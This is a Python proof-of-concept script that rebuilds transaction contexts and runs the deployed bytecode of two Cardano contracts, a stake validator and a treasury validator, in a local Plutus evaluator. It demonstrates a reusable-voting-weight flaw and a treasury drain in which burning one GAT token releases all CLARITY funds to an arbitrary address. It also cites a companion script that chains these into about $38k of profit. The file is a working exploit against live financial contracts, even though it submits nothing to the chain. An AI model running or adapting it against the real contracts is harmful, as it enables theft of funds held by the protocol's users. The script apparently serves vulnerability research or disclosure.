#!/usr/bin/env python3
# =============================================================================
# Real-bytecode verification of the two custody gates, run in the UPLC CEK
# machine (same evaluator a Cardano node uses in phase-2). Nothing is submitted.
#
#  GATE 1 — stake validator 08921c4b (the recyclable-weight BUG):
#     Reconstructs the ScriptContext of a REAL delock tx and runs the deployed
#     7,946-byte validator on it. Shows delock ACCEPTS keeping the full weight
#     while freeing the locked collateral, and (differential) that it will NOT
#     let you *reduce* the weight in that context -> weight is a forced ratchet.
#
#  GATE 2 — treasury validator fcc43cd5 (the DRAIN):
#     Shows a single GAT (33230e1d) burn makes the deployed validator release
#     ALL funds to an arbitrary address; rejects without the burn.
#
# Requires: pip install uplc==1.3.3 cbor2==5.6.5
# =============================================================================
import json, binascii, sys, threading, os, copy
sys.setrecursionlimit(10_000_000)
import uplc
from uplc import ast as A

HERE = os.path.dirname(os.path.abspath(__file__))
D    = lambda p: os.path.join(HERE, "data", p)
GAT  = "33230e1de259f957d1d857ea37ca810950b4c47d7ed8db9086e9d28d"
TRE  = "fcc43cd5b28c5a37e1f6c7fca4af2fd16552c8ecaf6534c2359eb073"
EFF  = "e9f35533da52ef2f7f30983b28d21ee507fec19e3fe274176d41a6f6"
CLAR = "1e76aaec4869308ef5b61e81ebf229f2e70f75a50223defa087f807b"
TRE_CLAR = 780_384_895_000_524

# ---- Plutus Data builders --------------------------------------------------
def I(n): return A.PlutusInteger(n)
def Bs(h):
    if isinstance(h, str): h = binascii.unhexlify(h) if h else b""
    return A.PlutusByteString(h)
def Lst(xs): return A.PlutusList(list(xs))
def Mp(kvs): return A.PlutusMap({k: v for k, v in kvs})
def Cn(i, xs): return A.PlutusConstr(i, list(xs))
def accepts(prog, *args):
    try: return isinstance(uplc.eval(prog, *args).result, A.BuiltinUnit)
    except Exception: return False

# ---- Koios datum JSON -> PlutusData ----------------------------------------
def conv(d):
    if 'int'  in d and len(d) == 1: return I(d['int'])
    if 'bytes'in d and len(d) == 1: return Bs(d['bytes'] or "")
    if 'list' in d: return Lst([conv(x) for x in d['list']])
    if 'map'  in d: return Mp([(conv(kv['k']), conv(kv['v'])) for kv in d['map']])
    if 'constructor' in d: return Cn(d['constructor'], [conv(x) for x in d['fields']])
    raise ValueError(str(d)[:80])

# ---- address / value / slot helpers ----------------------------------------
_CH = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def _b32d(b):
    pos = b.rfind('1'); data = [_CH.find(c) for c in b[pos+1:]][:-6]
    acc = bits = 0; out = []
    for v in data:
        acc = (acc<<5)|v; bits += 5
        while bits >= 8: bits -= 8; out.append((acc>>bits)&0xff)
    return bytes(out)
def address_data(bech):
    raw = _b32d(bech); typ = raw[0] >> 4; body = raw[1:]
    if typ in (0, 1):
        pay, stake = body[:28], body[28:56]
        pc = Cn(0,[Bs(pay)]) if typ == 0 else Cn(1,[Bs(pay)])
        return Cn(0,[pc, Cn(0,[Cn(0,[Cn(0,[Bs(stake)])])])])
    if typ in (6, 7):
        pc = Cn(0,[Bs(body[:28])]) if typ == 6 else Cn(1,[Bs(body[:28])])
        return Cn(0,[pc, Cn(1,[])])
    raise ValueError(f"addr type {typ}")
def signer_pkh(bech): return _b32d(bech)[1:29]
def value_data(lovelace, asset_list):
    m = {b"": {b"": int(lovelace)}}
    for a in (asset_list or []):
        m.setdefault(binascii.unhexlify(a['policy_id']), {})[binascii.unhexlify(a['asset_name'] or "")] = int(a['quantity'])
    return Mp([(Bs(cs), Mp([(Bs(tn), I(m[cs][tn])) for tn in sorted(m[cs])])) for cs in sorted(m)])
def slot_to_posix_ms(slot): return (1596059091 + (slot - 4492800)) * 1000
def txoutref(txh, ix): return Cn(0, [Cn(0, [Bs(txh)]), I(ix)])
def txout(o):
    dat = Cn(2, [conv(o['inline_datum']['value'])]) if o.get('inline_datum') else Cn(0, [])
    return Cn(0, [address_data(o['payment_addr']['bech32']), value_data(o['value'], o.get('asset_list')), dat, Cn(1, [])])

# ---- GATE 1: real stake validator on a real delock context -----------------
def stake_context(tx, weight_override=None):
    ins = tx['inputs']; outs = copy.deepcopy(tx['outputs'])
    if weight_override is not None:
        for o in outs:
            if o['payment_addr']['bech32'].startswith('addr1wyyfy8z'):
                for kv in o['inline_datum']['value']['list'][5]['map']:
                    if kv['k']['int'] == 1: kv['v']['int'] = weight_override
    ins_sorted = sorted(ins, key=lambda i: (i['tx_hash'], i['tx_index']))
    inputs_d = Lst([Cn(0, [txoutref(i['tx_hash'], i['tx_index']), txout(i)]) for i in ins_sorted])
    outputs_d = Lst([txout(o) for o in outs])
    lo, hi = slot_to_posix_ms(int(tx['invalid_before'])), slot_to_posix_ms(int(tx['invalid_after']))
    rng = Cn(0, [Cn(0, [Cn(1, [I(lo)]), Cn(1, [])]), Cn(0, [Cn(1, [I(hi)]), Cn(0, [])])])
    wallet = [i for i in ins if i['payment_addr']['bech32'].startswith('addr1q')][0]
    sigs = Lst([Bs(signer_pkh(wallet['payment_addr']['bech32']))])
    reds = [(Cn(1, [txoutref(p['spends_input']['tx_hash'], p['spends_input']['tx_index'])]),
             conv(p['input']['redeemer']['datum']['value'])) for p in tx['plutus_contracts']]
    txinfo = Cn(0, [inputs_d, Lst([]), outputs_d, value_data(int(tx['fee']), []), Mp([]),
                    Lst([]), Mp([]), rng, sigs, Mp(reds), Mp([]), Cn(0, [Bs(tx['tx_hash'])])])
    sc = [p for p in tx['plutus_contracts'] if p['script_hash'].startswith('08921c4b')][0]
    si = [i for i in ins if i['payment_addr']['bech32'].startswith('addr1wyyfy8z')][0]
    ctx = Cn(0, [txinfo, Cn(1, [txoutref(sc['spends_input']['tx_hash'], sc['spends_input']['tx_index'])])])
    return conv(si['inline_datum']['value']), conv(sc['input']['redeemer']['datum']['value']), ctx

def gate1_stake():
    prog = uplc.unflatten(binascii.unhexlify(open(D("stake_08921c4b.cbor")).read().strip()))
    tx   = json.load(open(D("delock_tx_6a2a55a2.json")))[0]
    W    = 63_497_959_270_744; freed = 5_000_000_000_000
    d, r, ctx_keep = stake_context(tx, None)
    _, _, ctx_dec  = stake_context(tx, W - freed)
    keep = accepts(prog, d, r, ctx_keep)
    dec  = accepts(prog, d, r, ctx_dec)
    print("  GATE 1 — deployed stake validator 08921c4b, real delock tx 6a2a55a2")
    print(f"    delock frees 5,000,000 CLARITY; output weight can be:")
    print(f"      KEPT at 63,497,959   -> {'ACCEPT' if keep else 'reject'}   <- attacker keeps the weight")
    print(f"      REDUCED by 5,000,000 -> {'ACCEPT' if dec  else 'REJECT'}   <- validator forbids reducing it")
    return keep and not dec

# ---- GATE 2: real treasury validator drains on a GAT burn ------------------
def saddr(h): return Cn(0, [Cn(1, [Bs(h)]), Cn(1, [])])
def paddr(h): return Cn(0, [Cn(0, [Bs(h)]), Cn(1, [])])
ALWAYS = Cn(0, [Cn(0, [Cn(0, []), Cn(0, [])]), Cn(0, [Cn(2, []), Cn(0, [])])])
def _val(entries):
    m = {}
    for p, n, q in entries: m.setdefault(p, []).append((n, q))
    return Mp([(Bs(p), Mp([(Bs(n), I(q)) for n, q in t])) for p, t in m.items()])
def treasury_context(gat_on_input, gat_mint):
    ref = txoutref("aa"*32, 0)
    ins = [Cn(0, [ref, Cn(0, [saddr(TRE), _val([("","",2_000_000),(CLAR,"",TRE_CLAR)]), Cn(0,[]), Cn(1,[])])])]
    if gat_on_input:
        ins.append(Cn(0, [txoutref("dd"*32,0), Cn(0,[saddr(EFF), _val([("","",2_000_000),(GAT,"",1)]), Cn(0,[]), Cn(1,[])])]))
    out = Cn(0, [paddr("bb"*28), _val([("","",2_000_000),(CLAR,"",TRE_CLAR)]), Cn(0,[]), Cn(1,[])])
    mint = _val([(GAT,"",gat_mint)]) if gat_mint is not None else Mp([])
    txinfo = Cn(0, [Lst(ins), Lst([]), Lst([out]), _val([("","",200_000)]), mint, Lst([]), Mp([]),
                    ALWAYS, Lst([Bs("bb"*28)]), Mp([]), Mp([]), Cn(0,[Bs("cc"*32)])])
    return Cn(0, [txinfo, Cn(1, [ref])])
def gate2_treasury():
    raw = binascii.unhexlify(open(D("treasury_fcc43cd5.cbor")).read().strip())
    prog = uplc.unflatten(raw)
    binding = GAT.encode() in binascii.hexlify(raw)
    drain   = accepts(prog, Cn(0,[]), Cn(0,[]), treasury_context(True,  -1))
    no_gat  = not accepts(prog, Cn(0,[]), Cn(0,[]), treasury_context(False, -1))
    no_burn = not accepts(prog, Cn(0,[]), Cn(0,[]), treasury_context(True,  +1))
    print("  GATE 2 — deployed treasury validator fcc43cd5")
    print(f"    GAT policy 33230e1d hardcoded in validator     : {binding}")
    print(f"    GAT burned -> release 780,384,895 CLARITY to me : {'ACCEPT' if drain else 'reject'}")
    print(f"    rejected when no GAT / GAT not burned           : {no_gat and no_burn}")
    return binding and drain and no_gat and no_burn

def main():
    res = {}
    def work():
        print("="*72); print(" REAL DEPLOYED BYTECODE — run in the UPLC CEK machine (no mainnet submit)"); print("="*72)
        res['g1'] = gate1_stake(); print()
        res['g2'] = gate2_treasury()
    threading.stack_size(1024*1024*512); t = threading.Thread(target=work); t.start(); t.join()
    ok = res.get('g1') and res.get('g2')
    print("="*72)
    print(" BOTH CUSTODY GATES PROVEN ON REAL BYTECODE ✓" if ok else " (unexpected — inspect above)")
    print(" delock keeps (is forced to keep) the weight, and one GAT burn drains the")
    print(" treasury. poc.py chains these into 3,100 ADA -> ~+$38k.")
    return ok

if __name__ == "__main__":
    sys.exit(0 if main() else 1)
